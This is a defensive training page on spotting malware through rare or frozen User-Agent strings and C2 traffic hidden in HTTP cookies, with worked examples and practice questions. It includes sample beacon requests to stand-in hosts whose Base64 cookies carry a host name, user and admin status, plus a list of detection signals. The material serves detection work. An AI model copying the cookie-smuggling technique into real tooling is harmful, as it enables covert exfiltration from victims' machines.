---
title: "Finding Malware through User-Agents and Cookies"
tags:
  - training
  - blue-team
  - http
  - analysis
---

# Finding Malware through User-Agents and Cookies { #user-agents-cookies }

!!! abstract "What this page covers"
    Why malware gets caught by its User-Agent (the value fixed when it was built), taking a User-Agent apart field by field and tools for it, counting every User-Agent in the organisation to find rare ones (**frequency analysis**), **version aging** that exposes malware over time, and C2 hidden in the rarely logged Cookie field and how to spot it (including a supply-chain case). Practice questions with answers are at the end.

!!! note "Labels"
    **[Added]** = practical must-know, **[Changed]**/**[Caution]** = what changed recently and what is risky if done the old way. The basics of the User-Agent and Cookie headers are on the [request headers](../http/post-methods-headers.md#user-agent) page.

## Eight key points { #key-points }

1. The User-Agent is optional and **self-reported**, yet often useful for catching malware.
2. Much malware doesn't disguise its User-Agent at all, or uses values that don't fit your environment (Linux, banned browsers).
3. Even when it mimics a real browser, **the version baked in at build time stays fixed** and stands out more as your fleet updates.
4. **Counting** every User-Agent in the organisation (frequency analysis) turns rare values into hunting leads.
5. Browser User-Agents almost always start with `Mozilla/5.0`. `Mozilla/4.0` or anything else means a very old browser or a non-browser program.
6. Cookies are sensitive, so **most logs don't record them** — a great hiding place for attackers.
7. Cookie-abuse signals: values that Base64-decode to host details, names/values that change every request, **cookies sent to a server that never set them**, and extra fields that weren't there before.
8. In a supply-chain attack, domain, URL and User-Agent can all be legitimate — with **only the cookie** out of place.

## Why malware gets caught by its User-Agent { #why-ua }

**Why it matters.** Malware authors must choose a User-Agent for their traffic when they build (compile) the program, and that choice eventually becomes a weakness:

1. **They don't bother.** Lots of malware uses library defaults like `python-requests/2.x` or `Go-http-client/1.1`, or nonsense values — easy to find in a SIEM to pinpoint infected PCs.
2. **It doesn't fit your environment.** Claiming Linux in a Windows-only organisation, or Firefox where policy doesn't allow it, stands out immediately.
3. **It's disguised but frozen.** Hard-coding a real value like "Chrome 95" hides it at first. But real Chrome ships a new version about every four weeks and company PCs auto-update, so over time that one PC looks like **a user who curiously never updates**.

The User-Agent is optional and self-reported, so it can't prove anything on its own ([request header caveats](../http/post-methods-headers.md#user-agent)) — but it's an excellent **lead to start an investigation**.

## Taking a User-Agent apart { #ua-deconstruction }

A Windows Firefox User-Agent, field by field:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
```

| Field | Value | Meaning |
| --- | --- | --- |
| Historical prefix | `Mozilla/5.0` | What almost every browser starts with; anything else means an old/non-standard browser or a non-browser program |
| Platform | `Windows NT 10.0; Win64; x64` | Windows 10/11, 64-bit browser. `WOW64` = a 32-bit browser on 64-bit Windows |
| Engine version | `rv:144.0` | Rendering engine (Gecko) version |
| Engine name | `Gecko/20100101` | Firefox's Gecko engine; the date-like number is fixed and rarely useful |
| Browser | `Firefox/144.0` | The actual browser and version |

The last field is confusing for other browsers:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15
Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1
```

- Line 1 **Chrome:** says `Safari` too, but it's `Chrome/144`; the engine field is `AppleWebKit`
- Line 2 **Edge:** Chrome's shape plus `Edg/` at the end → the trailing `Edg` is the identity
- Line 3 **Safari on Mac:** `Version/18.4 Safari` with no `Chrome` = Safari
- Line 4 **Safari on iPhone:** adds `iPhone` and `Mobile`

**[Added] The `Mozilla/5.0` rule.** Chrome and Firefox always have, and Microsoft has for every IE from IE9 plus all of Edge, used `Mozilla/5.0`. So `Mozilla/4.0 (compatible; MSIE ...)` is IE8 or older — or malware imitating it badly. Not starting with `Mozilla` at all means a non-browser program (updater, script, library). Not every non-browser is bad, but **you should be able to explain what program it is**.

**Tools.** Paste confusing strings into a User-Agent parsing site (useragentstring.com, etc.) or use an open-source parser (the ua-parser family) to split them into browser, version, OS and device. Most SIEMs include such parsers and expose User-Agent fields separately.

## Frequency analysis: finding rare User-Agents { #ua-frequency }

**What it is.** **Count** every User-Agent seen across the organisation and sort them. Normal ones cluster at the top with big numbers because many PCs share them; odd values used by one or two infected PCs sit in **the long tail** with small numbers — a good starting point for threat hunting.

Counting directly from Zeek `http.log`:

```
$ cat http.log | zeek-cut user_agent | sort | uniq -c | sort -n | head -5
      1 Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
      2 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
      3 Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36
     41 curl/8.9.1
    188 Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.18129; Pro)
```

- `cat http.log` — print the log
- `zeek-cut user_agent` — keep only the `user_agent` column
- `sort` — put identical values next to each other (`uniq` only counts adjacent duplicates)
- `uniq -c` — collapse duplicates, prefixing each with its count
- `sort -n` — sort numerically, smallest first
- `head -5` — show the top five lines (= the five rarest)

Reading it:

- **Line 1:** Linux Firefox 115 in a Windows-only organisation → find out who sent it and with what
- **Line 2:** IE7 on Windows Vista (`NT 6.0`) → impossible in 2026; likely malware's imitation
- **Line 3:** Chrome 118 → company Chrome is far newer; suspect version aging (below)
- **Line 4:** `curl` 41 times → could be developer or admin scripts; check which PC went where
- **Line 5:** Outlook 188 times → a normal business application

**[Added] Count PCs, not just requests.** By request count alone, chatty malware (like a beacon) can have a large number and escape the tail. Count **how many PCs (source IPs) use each User-Agent** as well — "9,000 requests, but exactly one PC" deserves a look. Conversely, many non-browser values are legitimate, such as `Microsoft-CryptoAPI/10.0` (the Windows component that checks certificate revocation), so look up unfamiliar names before judging.

## Version aging: it stands out over time { #version-aging }

Malware mimicking a real browser User-Agent still reveals itself if the version is fixed. Chrome and Edge release a new major version roughly every four weeks:

```
Month      Fleet's most common Chrome     PC FIN-PC07's Chrome
2025-01    Chrome/132.0.0.0               Chrome/118.0.0.0
2025-07    Chrome/138.0.0.0               Chrome/118.0.0.0
2026-01    Chrome/144.0.0.0               Chrome/118.0.0.0
```

Most company PCs climb versions via auto-update, but one stream of traffic from FIN-PC07 has been stuck on `Chrome/118` for years. Two possibilities:

- **Real Chrome with broken updates** — itself a security problem (an unpatched browser) that needs fixing
- **A program with a hard-coded Chrome User-Agent (malware)** — near-certain if the same PC's real Chrome tabs use the latest version while only traffic to one destination uses the old one

Checking whether **the same PC's User-Agents split into two** tells the two apart.

## C2 hidden in cookies { #cookies }

### Why cookies { #why-cookies }

Cookies carry sensitive values such as login sessions, so **most proxy and web server logs don't record them** (Zeek's default `http.log` has no cookie column). Data hidden in the cookie field stays invisible **until someone deliberately pulls it up** — a great hiding place for attackers.

### Case 1: C2 carrying host details in Base64 { #cookie-c2 }

Malware such as ChChes, used in targeted attacks in Japan in 2017, carried infected-host details Base64-encoded in cookies and exchanged C2 instructions that way. A similar-shaped example:

```
GET /Rk7pZ2/aQ9xL.htm HTTP/1.1
Cookie: k3Wq=cGM9RklOLVBDMDcmdT1qc21pdGgmYWRtPTE%3D; Zt=aWQ9NDQ3MTtvcz0xMC4wLjIyNjMx
Accept: */*
Host: news-update-cdn.example
```

- Path `/Rk7pZ2/aQ9xL.htm` — a randomly named `.htm`
- Cookie names `k3Wq`, `Zt` — meaningless random names
- `%3D` in the first value is URL-encoded `=`. Unwrapped it's `cGM9RklOLVBDMDcmdT1qc21pdGgmYWRtPTE=`, which Base64-decodes to **`pc=FIN-PC07&u=jsmith&adm=1`** (PC name, user, admin rights)
- The second value → **`id=4471;os=10.0.22631`** (infection ID, Windows build)
- Only `Accept: */*`, no User-Agent or Accept-Language → not a browser

### Case 2: a supply-chain attack where only the cookie differed { #supply-chain-cookie }

NotPetya, which crippled companies worldwide in 2017, spread through a **hijacked update server** of Ukrainian accounting software (M.E.Doc), riding on legitimate updates. The backdoor planted beforehand used the software's normal update-check traffic, but its cookie carried **a few extra values beyond what belonged there** — for example, that it was running with administrator rights on the PC.

Everything an analyst would see looked normal:

| Field | State |
| --- | --- |
| Domain | The real update server of software the organisation actually used |
| URL | The usual update-check address |
| User-Agent | The software's genuine value |
| Interval | The usual update-check interval |
| Cookie | **One more field than usual** |

That's extraordinarily hard to spot — which is why nobody knew until the day the attackers used the C2 to push destructive malware. The lesson: **know your baseline**. Only if you know your key software's normal traffic (cookie names, sizes) will you notice one extra field.

### Cookie-abuse checklist { #cookie-checklist }

| Signal | Why it's suspicious |
| --- | --- |
| Values Base64-decode to host or user details | Real session cookies are usually meaningless random IDs |
| Cookie **names** change every request | Real sites keep the same names (`sessionid`, …) |
| Session cookie **values** change entirely every request | Login sessions keep a value for a while |
| A cookie on the very first request **although the server never sent `Set-Cookie`** | Browsers only return cookies they were given; a cookie to a never-visited domain was built by a program |
| **Extra fields** in a known application's traffic | Suspect a supply-chain compromise or tampering |
| Very long cookies, or sizes that vary widely | May be carrying data |

The fourth signal is especially strong: browsers only send back cookies the site previously set. So **a request to a domain contacted for the first time that already carries a cookie** means a program filled in the cookie field itself.

**[Added] Seeing cookies takes preparation.** Since cookies aren't logged by default, set up a way to view them when needed: full packet capture (where decryptable), detailed TLS-inspecting proxy records, or Zeek scripts that log extra headers. Cookies contain **real login sessions**, though, so if you record them, restrict access tightly and keep retention short — a leaked cookie log is session-hijacking material in itself.

## 2026 perspective { #trends }

!!! success "[Still valid in 2026]"
    "A User-Agent fixed at build time eventually stands out", "frequency analysis to find rare values", "cookies hide well because they're not logged" and "supply-chain attacks show only against a baseline" all hold.

!!! info "[Changed]"
    - **User-Agents carry less information.** With User-Agent Reduction, Chrome and Edge show minor versions as `0.0.0` and Windows 11 as `Windows NT 10.0`; Safari and Chrome freeze the macOS version at `Mac OS X 10_15_7`. "Is the OS version right?" is hard to judge from the User-Agent alone — check Client Hints (`Sec-CH-UA-*` headers) or endpoint asset data.
    - **Major-version comparison (version aging) still works.** Major numbers (`Chrome/144`) are still sent, so a frozen old version still stands out.
    - **Sophisticated C2 can change its User-Agent.** Frameworks such as Cobalt Strike and Sliver set User-Agents and headers through configuration, and some read the victim's real browser value. Then [header-order fingerprints](../http/post-methods-headers.md#header-order) (JA4H) and TLS fingerprints (JA4) help more than the User-Agent.
    - **With cookie theft now a major threat**, the cookie field matters both as "where C2 hides" and "what attackers steal" ([Cookie](../http/post-methods-headers.md#cookie)).
    - **Supply-chain attacks have kept coming.** After NotPetya came SolarWinds (2020), 3CX (2023) and others via legitimate software updates — all sharing "legitimate domain, legitimate signature".

!!! warning "[Caution] Wrong or risky if done the old way"
    - **A normal User-Agent doesn't mean a normal program.** It's easy to fake, and sometimes the victim's real browser sends the malicious request.
    - **Don't treat every non-browser User-Agent as malicious.** Windows components, business apps and updaters are everywhere; identify unfamiliar ones first.
    - **Don't log every cookie indiscriminately.** It amounts to stockpiling session-hijacking material. Define scope and retention and control access.

## Practice questions { #quiz }

### Question 1

In a Windows-only organisation, a week of User-Agents counts as follows (format: requests / PCs / User-Agent). Which would you investigate first, and which are probably normal?

```
 812044 / 806 / Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/144.0.0.0 Safari/537.36
  91233 / 805 / Microsoft-CryptoAPI/10.0
   8640 /   1 / Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/118.0.0.0 Safari/537.36
     12 /   1 / Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
      5 /   1 / Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
```

??? success "Answer and explanation"
    **Probably normal:**

    - Line 1 — the current Chrome used across the organisation
    - Line 2 — `Microsoft-CryptoAPI` is the legitimate Windows component that checks certificate revocation lists and the like; it appears on almost every PC (805)

    **Investigate first:**

    - **Line 3** — 8,640 requests (about 1,234 a day all week) but **one PC**, with `Chrome/118` far behind the fleet. Sorted by request count it doesn't sit in the tail; by PC count it stands out. Likely a beacon with a hard-coded Chrome User-Agent — compare with that PC's other traffic using current Chrome.
    - **Line 4** — IE7 on Windows Vista, impossible on a 2026 company PC; likely malware imitation.
    - **Line 5** — Linux Firefox in a Windows-only organisation: a personal device, a developer VM, or a disguise. Identify the device (IP) first.

    Next, find the PC behind each source IP and use Sysmon Event ID 3 to see **which process** made the connections.

### Question 2

On one PC, FIN-PC07, only the requests to one destination have used the User-Agent `Chrome/118.0.0.0` for two years. All other web requests from the same PC use the current `Chrome/144.0.0.0`. What does this mean?

??? success "Answer and explanation"
    The same PC's User-Agents **split in two**. Real Chrome is clearly on the latest version (144), so whatever uses the old one (118) is **a different program posing as Chrome** with a hard-coded value. Unchanged for two years means the value chosen when the program was built was never updated — classic malware **version aging**.

    Do: check the destination's reputation and the traffic's interval and size → find the executable behind the connection via Sysmon Event ID 3 → check its location, signature, hash and persistence → consider isolating the PC.

    (If **all** of the PC's Chrome traffic were 118, the reading would differ: real Chrome with broken updates — still an unpatched-browser security issue that needs fixing.)

### Question 3

A TLS-inspecting proxy's detailed records show the following. The PC contacted `cdn-assets-sync.example` **for the first time today** and has never received a `Set-Cookie` from it.

```
GET /v/9Hk2.htm HTTP/1.1
Host: cdn-assets-sync.example
Cookie: Qm7=cGM9RklOLVBDMDcmdT1qc21pdGgmYWRtPTE%3D
Accept: */*
```

Why is it suspicious, and what does the cookie value say?

??? success "Answer and explanation"
    **Why suspicious:** browsers only send back cookies a site previously set. Carrying a never-issued cookie to a domain contacted for the first time means **a program, not a browser, filled in the cookie field**. No User-Agent and only `Accept: */*` also point away from a browser.

    **The value:** replace `%3D` with `=` to get `cGM9RklOLVBDMDcmdT1qc21pdGgmYWRtPTE=`, which Base64-decodes to **`pc=FIN-PC07&u=jsmith&adm=1`** — PC name, user name, and that it's **running with admin rights**. The cookie name `Qm7` is meaningless too.

    **Conclusion and response:** this looks like a C2 check-in using the cookie field. Admin rights mean the attacker can do more, so it's high priority: isolate the PC, identify the connecting process (Sysmon Event ID 3), block the domain, find other PCs contacting it, and review the jsmith account and admin-rights activity on that PC.
